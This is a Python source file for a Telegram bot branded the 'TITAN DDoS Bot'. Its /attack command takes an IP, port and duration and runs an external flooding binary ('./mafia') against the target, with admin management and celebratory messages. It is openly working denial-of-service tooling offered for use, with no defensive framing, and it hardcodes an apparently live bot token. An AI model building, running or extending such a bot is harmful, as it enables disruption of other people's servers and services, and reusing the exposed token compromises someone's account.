#!/usr/bin/python3
import telebot
import subprocess
import threading
import logging
import datetime
import time
import os
import signal

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = '7846304529:AAFDKtojeysATwHk85P0RJCzLcWjn_A8p2E'
OWNER_ID = 7086729173  # Replace with your Telegram ID
ADMIN_IDS = [OWNER_ID]
bot = telebot.TeleBot(BOT_TOKEN)

# /start
@bot.message_handler(commands=['start'])
def start_cmd(msg):
    bot.reply_to(msg, "🔥 *Welcome to the TITAN DDoS Bot!*\n💻 Example: `/attack 1.2.3.4 80 60`", parse_mode='Markdown')

# /help
@bot.message_handler(commands=['help'])
def help_cmd(msg):
    help_msg = """🌟 *DDOS Bot Commands* 🌟
`/attack <IP> <PORT> <TIME>` - Launch attack
`/ping` - Bot speed check
`/addadmin <user_id>` - Add admin [owner]
`/deladmin <user_id>` - Remove admin [owner]
`/broadcast <message>` - Broadcast [admin]
"""
    bot.reply_to(msg, help_msg, parse_mode='Markdown')

# /ping
@bot.message_handler(commands=['ping'])
def ping_cmd(msg):
    start = time.time()
    m = bot.send_message(msg.chat.id, "Pinging...")
    end = time.time()
    bot.edit_message_text(f"`Pong! {round((end - start) * 1000)}ms`", msg.chat.id, m.message_id, parse_mode='Markdown')

# Execute attack
def execute_attack(ip, port, duration, chat_id):
    bot.send_message(chat_id, f"*ATTACK SHURU HO GAYA*\nTarget: `{ip}:{port}`\nDuration: `{duration}s`\n\n🔥 *MADE BY TITAN*", parse_mode='Markdown')
    process = subprocess.Popen(['./mafia', ip, port, duration])
    process.wait()
    bot.send_message(chat_id, "*ATTACK KHATAM HO GAYA*\n🎉 Ja bahi maze kar, attack lagya!", parse_mode='Markdown')

# /attack
@bot.message_handler(commands=['attack'])
def attack_cmd(msg):
    user_id = msg.from_user.id
    if user_id not in ADMIN_IDS:
        return bot.reply_to(msg, "Access Denied.")
    
    args = msg.text.split()
    if len(args) != 4:
        return bot.reply_to(msg, "Usage: /attack <ip> <port> <time>")
    
    ip, port, duration = args[1], args[2], args[3]
    threading.Thread(target=execute_attack, args=(ip, port, duration, msg.chat.id)).start()

# /addadmin
@bot.message_handler(commands=['addadmin'])
def addadmin_cmd(msg):
    if msg.from_user.id != OWNER_ID:
        return
    try:
        uid = int(msg.text.split()[1])
        if uid not in ADMIN_IDS:
            ADMIN_IDS.append(uid)
            bot.reply_to(msg, f"Added admin: {uid}")
    except:
        bot.reply_to(msg, "Usage: /addadmin <user_id>")

# /deladmin
@bot.message_handler(commands=['deladmin'])
def deladmin_cmd(msg):
    if msg.from_user.id != OWNER_ID:
        return
    try:
        uid = int(msg.text.split()[1])
        if uid in ADMIN_IDS and uid != OWNER_ID:
            ADMIN_IDS.remove(uid)
            bot.reply_to(msg, f"Removed admin: {uid}")
    except:
        bot.reply_to(msg, "Usage: /deladmin <user_id>")

# /broadcast
@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        message = msg.text[len("/broadcast "):]
        bot.send_message(msg.chat.id, f"Broadcast:\n{message}")
        # Add your broadcast loop to all chat IDs here
    except:
        bot.reply_to(msg, "Broadcast failed.")

# Polling
print("TITAN Bot running...")
bot.infinity_polling()
